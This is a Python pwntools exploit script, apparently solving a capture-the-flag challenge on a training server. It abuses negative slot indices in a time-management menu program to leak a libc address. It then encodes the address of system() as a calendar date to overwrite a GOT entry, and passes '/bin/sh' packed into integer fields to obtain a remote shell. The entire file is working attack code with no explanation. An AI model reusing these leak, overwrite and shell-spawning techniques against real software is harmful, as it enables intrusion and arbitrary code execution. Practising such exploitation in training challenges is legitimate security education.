#!/usr/bin/env python3
from pwn import *
import datetime
import re

PORT = 1337
HOST = "pwn-time-lord-1-67ca56196b93.training.bksec.vn"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x000000000000132D
            brva 0x0000000000001521
            brva 0x00000000000015ED
            brva 0x00000000000016B3
            brva 0x00000000000014AD
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt): sla(b'> ', str(opt).encode())

def inspect(): menu(1)

def make_time(y, M, d, h, m, s):
    menu(2)
    sla(b'Year: ', str(y).encode())
    sla(b'Month: ', str(M).encode())
    sla(b'Day: ', str(d).encode())
    sla(b'Hour: ', str(h).encode())
    sla(b'Minute: ', str(m).encode())
    sla(b'Second: ', str(s).encode())

def archive(i):
    menu(3)
    sla(b'Slot Index: ', str(i).encode())

def restore(i):
    menu(4)
    sla(b'Slot Index: ', str(i).encode())

months = {'Jan': 1, 'Feb': 2, 'Mar': 3, 'Apr': 4, 'May': 5, 'Jun': 6,
          'Jul': 7, 'Aug': 8, 'Sep': 9, 'Oct': 10, 'Nov': 11, 'Dec': 12}

def count_leap_years(y):
    return y // 4 - y // 100 + y // 400

def convertInt(data) -> int:
    data2 = data.decode('utf-8')

    match = re.search(r'([A-Z][a-z]{2}) ([A-Z][a-z]{2})\s+(\d+)\s+(\d+):(\d+):(\d+)\s+(\d+)', data2)
    weekday, mon_str, day, h, m, s, year = match.groups()
    year, day, h, m, s = map(int, [year, day, h, m, s])
    month = months[mon_str]


    leaps_since_epoch = count_leap_years(year - 1) - count_leap_years(1969)
    total_days = (year - 1970) * 365 + leaps_since_epoch

    days_in_month = [0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    if year % 4 == 0 and (year % 100 != 0 or year % 400 == 0):
        days_in_month[2] = 29

    total_days += sum(days_in_month[:month])
    total_days += (day - 1)

    timestamp_utc = total_days * 86400 + h * 3600 + m * 60 + s
    
    timezone_offset = 7 * 3600
    timestamp_final = timestamp_utc - timezone_offset
    return timestamp_final

def manually_branch(timestamp):
    timezone_offset = 7 * 3600
    local_seconds = timestamp + timezone_offset
    
    days_since_1970 = local_seconds // 86400
    seconds_in_day = local_seconds % 86400
    
    hour = seconds_in_day // 3600
    minute = (seconds_in_day % 3600) // 60
    second = seconds_in_day % 60
    
    days = days_since_1970 + 719162
    
    qc_cycles = days // 146097
    days %= 146097
    
    c_cycles = min(days // 36524, 3)
    days -= c_cycles * 36524
    
    q_cycles = days // 1461
    days %= 1461
    
    y_cycles = min(days // 365, 3)
    days -= y_cycles * 365
    
    year = 1 + qc_cycles * 400 + c_cycles * 100 + q_cycles * 4 + y_cycles
    
    is_leap = (year % 4 == 0 and (year % 100 != 0 or year % 400 == 0))
    days_in_month = [31, 29 if is_leap else 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    
    month = 0
    while days >= days_in_month[month]:
        days -= days_in_month[month]
        month += 1
        
    month += 1
    day = days + 1

    make_time(year, month, day, hour, minute, second)

# Leak libc

for i in range(128):
    restore(-2)

inspect()
p.recvuntil(b'Current Timeline: ')
raw = p.recvline().strip()
libc.address = convertInt(raw) - 0x2048e0
log.info(f'libc: {hex(libc.address)}')

# GOT overwrite

system = libc.sym.system

manually_branch(system)

archive(-11)
GDB()
make_time(1, 2, 3, 4, 0x0068732f, 0x6e69622f)


p.interactive()